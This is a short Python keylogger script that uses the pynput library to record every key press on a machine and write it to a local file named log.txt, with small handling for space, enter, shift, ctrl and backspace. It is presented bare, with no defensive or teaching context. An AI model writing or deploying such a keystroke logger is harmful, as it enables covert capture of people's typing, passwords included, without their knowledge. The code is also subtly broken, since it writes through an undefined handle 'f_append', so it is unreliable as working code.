from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    data = letter[1:len(letter)-1]
    if letter == 'Key.space':
        data = " "
    elif letter == 'Key.enter':
        data = "\n"
    elif letter == 'Key.shift_r' or letter == 'Key.ctrl_l':
        data = ""
    with open ("log.txt", 'rb+') as f:
        if (letter == 'Key.backspace'):
            f.seek(0,2)
            if (f.tell() > 0):
                f.seek(-1,2)
                f.truncate()
        else : 
            f_append.write(data.encode())

with Listener(on_press=writetofile) as l:
    l.join()
